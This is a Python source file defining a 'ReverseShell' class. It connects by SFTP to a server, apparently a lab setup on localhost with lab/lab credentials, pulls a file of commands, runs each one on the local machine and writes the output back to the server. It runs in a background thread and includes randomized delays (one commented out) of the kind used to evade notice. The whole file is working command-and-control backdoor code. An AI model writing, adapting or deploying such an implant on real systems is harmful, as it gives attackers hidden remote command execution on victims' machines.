import paramiko
import subprocess
import traceback
import threading
import random
import time
import getpass
from datetime import datetime
THREE_HOURS_IN_SECONDS = 10800
THIRTY_MIN_IN_SEC = 1800
class ReverseShell:
    def __init__(self):
        self.username = getpass.getuser()
        self.host = "localhost"
        self.port = 2200
        self.processtime = random.randint(2, 4)
    
    def _reverseShell(self) -> None:
        waitTime = random.randint(THIRTY_MIN_IN_SEC, THREE_HOURS_IN_SECONDS )
        #time.sleep(waitTime)
        #Connects to the SFTP Server, recieves a file of commands, runs the commands and logs the output into a file on the server
        while True:
            time.sleep
            now = datetime.now()
            currTime = now.strftime("%H:%M:%S")
            try:
                transport = paramiko.Transport((self.host, self.port))
                transport.connect(None,  'lab','lab')
                sftp = paramiko.SFTPClient.from_transport(transport)
                filename = str(self.username) + currTime
                output = sftp.open("/home/lab/" + filename,  "w+")
                with sftp.open("/home/lab/inputFile",  "r") as f:
                    for line in f:
                        command = line.rstrip()
                        time.sleep(self.processtime)
                        out = subprocess.check_output(command.split())
                        output.write(out)
            except Exception as e:
                print("*** Error: %s: %s" % (e.__class__,  e) )
                traceback.print_exc()
        
    def start(self) -> None:
        thread = threading.Thread(target=self._reverseShell)
        thread.start()
